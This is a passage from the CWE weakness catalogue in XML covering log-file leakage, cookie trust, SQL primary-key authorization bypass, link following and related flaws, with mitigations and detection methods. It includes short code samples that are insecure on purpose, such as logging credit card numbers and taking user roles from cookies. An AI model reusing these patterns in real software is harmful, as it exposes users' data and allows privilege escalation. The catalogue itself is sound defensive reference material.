               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>At a minimum, an attacker who retrieves this file would have all the information contained in it, whether that be database calls, the format of parameters accepted by the application, or simply information regarding the architectural structure of your site.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Policy</Phase>
               <Description>Recommendations include implementing a security policy within your organization that prohibits backing up web application source code in the webroot.</Description>
            </Mitigation>
         </Potential_Mitigations>
         
      </Weakness>
      <Weakness ID="532" Name="Inclusion of Sensitive Information in Log Files" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>Information written to log files can be of a sensitive nature and give valuable guidance to an attacker or expose sensitive user information.</Description>
         <Extended_Description>
            <xhtml:p>While logging all information may be helpful during development stages, it is important that logging levels be set appropriately before a product ships so that sensitive user data and system information are not accidentally exposed to potential attackers.</xhtml:p>
            <xhtml:p>Different log files may be produced and stored for:</xhtml:p>
            <xhtml:ul>
               <xhtml:li>Server log files (e.g. server.log).  This can give information on whatever application left the file. Usually this can give full path names and system information, and sometimes usernames and passwords.</xhtml:li>
               <xhtml:li>log files that are used for debugging</xhtml:li>
               <xhtml:li/>
            </xhtml:ul>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="538" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="538" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="200" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="552" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="552" View_ID="699"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>Logging sensitive user data often provides attackers with an additional, less-protected path to acquiring the information.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>Consider seriously the sensitivity of the information written into log files. Do not write secrets into the log files.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Distribution</Phase>
               <Description>Remove debug log files before deploying the application into production.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Description>Protect log files against unauthorized read/write.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Adjust configurations appropriately when software is transitioned from a debug state to production.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the following code snippet, a user's full name and credit card number are written to a log file.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>logger.info("Username: " + usernme + ", CCN: " + ccn);</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This code stores location information about the current user:</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>locationClient = new LocationClient(this, this, this);<xhtml:br/>locationClient.connect();<xhtml:br/>currentUser.setLocation(locationClient.getLastLocation());<xhtml:br/>
                     <xhtml:i>...</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>catch (Exception e) {<xhtml:div style="margin-left:10px;">AlertDialog.Builder builder = new AlertDialog.Builder(this);<xhtml:br/>builder.setMessage("Sorry, this application has experienced an error.");<xhtml:br/>AlertDialog alert = builder.create();<xhtml:br/>alert.show();<xhtml:br/>Log.e("ExampleActivity", "Caught exception: " + e + " While on User:" + User.toString());</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>When the application encounters an exception it will write the user object to the log. Because the user object contains location information, the user's location is also written to the log.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>FIO13-J</Entry_ID>
               <Entry_Name>Do not log sensitive information outside a trust boundary</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="215"/>
         </Related_Attack_Patterns>
         
      </Weakness>
      <Weakness ID="538" Name="File and Directory Information Exposure" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product stores sensitive information in files or directories that are accessible to actors outside of the intended control sphere.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="200" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="200" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Files or Directories</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Phase>System Configuration</Phase>
               <Description>Do not expose file and directory information to the user.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="95"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 12: Information Leakage.&#34; Page 191"/>
         </References>
         <Notes>
            <Note Type="Maintenance">Depending on usage, this could be a weakness or a category. Further study of all its children is needed, and the entire sub-tree may need to be clarified. The current organization is based primarily on the exposure of sensitive information as a consequence, instead of as a primary weakness.</Note>
            <Note Type="Maintenance">There is a close relationship with CWE-552, which is more focused on weaknesses. As a result, it may be more appropriate to convert CWE-538 to a category.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="544" Name="Missing Standardized Error Handling Mechanism" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software does not use a standardized method for handling errors throughout the code, which might introduce inconsistent error handling and resultant weaknesses.</Description>
         <Extended_Description>If the application handles error messages individually, on a one-by-one basis, this is likely to result in inconsistent error handling. The causes of errors may be lost. Also, detailed information about the causes of an error may be unintentionally returned to the user.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="755" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Other</Scope>
               <Impact>Quality Degradation</Impact>
               <Impact>Unexpected State</Impact>
               <Impact>Varies by Context</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>define a strategy for handling errors of different severities, such as fatal errors versus basic log events. Use or create built-in language features, or an external package, that provides an easy-to-use API and define coding standards for the detection and handling of errors.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ERR00-C</Entry_ID>
               <Entry_Name>Adopt and implement a consistent and comprehensive error-handling policy</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         
      </Weakness>
      <Weakness ID="550" Name="Information Exposure Through Server Error Message" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>Certain conditions, such as network failure, will cause a server error message to be displayed.</Description>
         <Extended_Description>While error messages in and of themselves are not dangerous, per se, it is what an attacker can glean from them that might cause eventual problems.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="209" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="209" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>System Configuration</Phase>
               <Description>Recommendations include designing and adding consistent error handling mechanisms which are capable of handling any user input to your web application, providing meaningful detail to end-users, and preventing error messages that might provide information useful to an attacker from being displayed.</Description>
            </Mitigation>
         </Potential_Mitigations>
         
      </Weakness>
      <Weakness ID="551" Name="Incorrect Behavior Order: Authorization Before Parsing and Canonicalization" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>If a web server does not fully parse requested URLs before it examines them for authorization, it may be possible for an attacker to bypass authorization protection.</Description>
         <Extended_Description>For instance, the character strings /./ and / both mean current directory. If /SomeDirectory is a protected directory and an attacker requests /./SomeDirectory, the attacker may be able to gain access to the resource if /./ is not converted to / before the authorization check is performed.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="863" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="863" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="696" View_ID="1000"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>URL Inputs should be decoded and canonicalized to the application's current internal representation before being validated and processed for authorization. Make sure that your application does not decode the same input twice. Such errors could be used to bypass whitelist schemes by introducing dangerous inputs after they have been checked.</Description>
            </Mitigation>
         </Potential_Mitigations>
         
      </Weakness>
      <Weakness ID="552" Name="Files or Directories Accessible to External Parties" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>Files or directories are accessible in the environment that should not be.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Files or Directories</Impact>
               <Impact>Modify Files or Directories</Impact>
            </Consequence>
         </Common_Consequences>
         <Affected_Resources>
            <Affected_Resource>File or Directory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A10</Entry_ID>
               <Entry_Name>Insecure Configuration Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>FIO15-C</Entry_ID>
               <Entry_Name>Ensure that file operations are performed in a secure directory</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="150"/>
            <Related_Attack_Pattern CAPEC_ID="509"/>
            <Related_Attack_Pattern CAPEC_ID="639"/>
         </Related_Attack_Patterns>
         
      </Weakness>
      <Weakness ID="565" Name="Reliance on Cookies without Validation and Integrity Checking" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The application relies on the existence or values of cookies when performing security-critical operations, but it does not properly ensure that the setting is valid for the associated user.</Description>
         <Extended_Description>Attackers can easily modify cookies, within the browser or by implementing the client-side code outside of the browser. Reliance on cookies without detailed validation and integrity checking can allow attackers to bypass authentication, conduct injection attacks such as SQL injection and cross-site scripting, or otherwise modify inputs in unexpected ways.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="642" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="602" View_ID="1000"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>It is dangerous to use cookies to set a user's privileges. The cookie can be manipulated to escalate an attacker's privileges to an administrative level.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Avoid using cookie data for a security-related decision.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Perform thorough input validation (i.e.: server side validation) on the cookie data if you're going to use it for a security related decision.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Add integrity checks to detect tampering.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Protect critical cookies from replay attacks, since cross-site scripting or other attacks may allow attackers to steal a strongly-encrypted cookie that also passes integrity checks. This mitigation applies to cookies that should only be valid during a single transaction or session. By enforcing timeouts, you may limit the scope of an attack. As part of your integrity check, use an unpredictable, server-side value that is not exposed to the client.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-61">
               <Intro_Text>The following code excerpt reads a value from a browser cookie to determine the role of the user.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>Cookie[] cookies = request.getCookies();<xhtml:br/>for (int i =0; i&lt; cookies.length; i++) {<xhtml:div style="margin-left:10px;">Cookie c = cookies[i];<xhtml:br/>if (c.getName().equals("role")) {<xhtml:div style="margin-left:10px;">userRole = c.getValue();</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>It is easy for an attacker to modify the "role" value found in the locally stored cookie, allowing privilege escalation.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP29</Entry_ID>
               <Entry_Name>Faulty endpoint authentication</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="226"/>
            <Related_Attack_Pattern CAPEC_ID="31"/>
            <Related_Attack_Pattern CAPEC_ID="39"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Relationship">This problem can be primary to many types of weaknesses in web applications. A developer may perform proper validation against URL parameters while assuming that attackers cannot modify cookies. As a result, the program might skip basic input validation to enable cross-site scripting, SQL injection, price tampering, and other attacks..</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="566" Name="Authorization Bypass Through User-Controlled SQL Primary Key" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The software uses a database table that includes records that should not be accessible to an actor, but it executes a SQL statement with a primary key that can be controlled by that actor.</Description>
         <Extended_Description>
            <xhtml:p>When a user can set a primary key to any value, then the user can modify the key to point to unauthorized records.</xhtml:p>
            <xhtml:p>Database access control errors occur when:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ul>
                  <xhtml:li>Data enters a program from an untrusted source.</xhtml:li>
                  <xhtml:li>The data is used to specify the value of a primary key in a SQL query.</xhtml:li>
                  <xhtml:li>The untrusted source does not have the permissions to be able to access all rows in the associated table.</xhtml:li>
               </xhtml:ul>
            </xhtml:div>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="639" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="639" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Technology Name="Database Server" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Access Control</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Assume all input is malicious. Use a standard input validation mechanism to validate all input for length, type, syntax, and business rules before accepting the data. Use an "accept known good" validation strategy.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use a parameterized query AND make sure that the accepted values conform to the business rules. Construct your SQL statement accordingly.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user.</Intro_Text>
               <Example_Code Nature="bad" Language="C#">
                  <xhtml:div>...<xhtml:br/>conn = new SqlConnection(_ConnectionString);<xhtml:br/>conn.Open();<xhtml:br/>int16 id = System.Convert.ToInt16(invoiceID.Text);<xhtml:br/>SqlCommand query = new SqlCommand( "SELECT * FROM invoices WHERE id = @id", conn);<xhtml:br/>query.Parameters.AddWithValue("@id", id);<xhtml:br/>SqlDataReader objReader = objCommand.ExecuteReader();<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The problem is that the developer has not considered all of the possible values of id. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker can bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP25</Entry_ID>
               <Entry_Name>Tainted input to variable</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         
      </Weakness>
      <Weakness ID="579" Name="J2EE Bad Practices: Non-serializable Object Stored in Session" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The application stores a non-serializable object as an HttpSession attribute, which can hurt reliability.</Description>
         <Extended_Description>A J2EE application can make use of multiple JVMs in order to improve application reliability and performance. In order to make the multiple JVMs appear as a single application to the end user, the J2EE container can replicate an HttpSession object across multiple JVMs so that if one JVM becomes unavailable another can step in and take its place without disrupting the flow of the application. This is only possible if all session data is serializable, allowing the session to be duplicated between the JVMs.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="573" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="573" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="Java" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Quality Degradation</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>In order for session replication to work, the values the application stores as attributes in the session must implement the Serializable interface.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following class adds itself to the session, but because it is not serializable, the session can no longer be replicated.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>public class DataGlob {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>String globName;<xhtml:br/>String globValue;<xhtml:br/>
                           <xhtml:br/>public void addToSession(HttpSession session) {<xhtml:div style="margin-left:10px;">session.setAttribute("glob", this);</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP1</Entry_ID>
               <Entry_Name>Glitch in computation</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         
      </Weakness>
      <Weakness ID="59" Name="Improper Link Resolution Before File Access ('Link Following')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software attempts to access a file based on the filename, but it does not properly prevent that filename from identifying a link or shortcut that resolves to an unintended resource.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="706" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="706" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Operating_System Class="Windows" Prevalence="Sometimes"/>
            <Operating_System Class="Unix" Prevalence="Often"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>Soft links are a UNIX term that is synonymous with simple shortcuts on windows based platforms.</Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>insecure temporary file</Term>
               <Description>Some people use the phrase "insecure temporary file" when referring to a link following weakness, but other weaknesses can produce insecure temporary files without any symlink involvement at all.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Access Control</Scope>
               <Impact>Read Files or Directories</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>An attacker may be able to traverse the file system to unintended locations and read or overwrite the contents of unexpected files. If the files are used for a security mechanism then an attacker may be able to bypass the mechanism.</Note>
            </Consequence>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>Windows simple shortcuts, sometimes referred to as soft links, can be exploited remotely since a ".LNK" file can be uploaded like a normal file. This can enable remote execution.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-48.1">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>
                  <xhtml:p>Follow the principle of least privilege when assigning access rights to entities in a software system.</xhtml:p>
